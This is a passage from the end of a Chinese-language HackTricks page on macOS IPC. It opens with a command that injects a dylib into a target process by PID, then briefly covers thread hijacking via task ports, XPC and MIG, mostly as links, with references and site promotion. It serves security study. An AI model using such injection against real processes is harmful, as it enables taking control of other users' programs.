./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### 通过任务端口进行线程劫持 <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

在这种技术中，进程的一个线程被劫持：

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### 基本信息

XPC代表XNU（macOS使用的内核）进程间通信，是macOS和iOS上进程之间通信的框架。XPC提供了一种机制，用于在系统上不同进程之间进行安全的异步方法调用。这是苹果安全范式的一部分，允许创建特权分离的应用程序，其中每个组件仅以执行其工作所需的权限运行，从而限制受损进程可能造成的潜在损害。

有关此通信工作方式及其可能存在的漏洞的更多信息，请查看：

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/" %}
[macos-xpc](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG旨在简化Mach IPC代码创建过程。它基本上为服务器和客户端生成所需的通信代码。即使生成的代码很丑陋，开发人员只需导入它，他的代码将比以前简单得多。

有关更多信息，请查看：

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## 参考资料

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的公司广告或下载PDF版本，请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS Family**](https://opensea.io/collection/the-peass-family)，我们独家NFT收藏品的集合
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**上关注**我们。
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
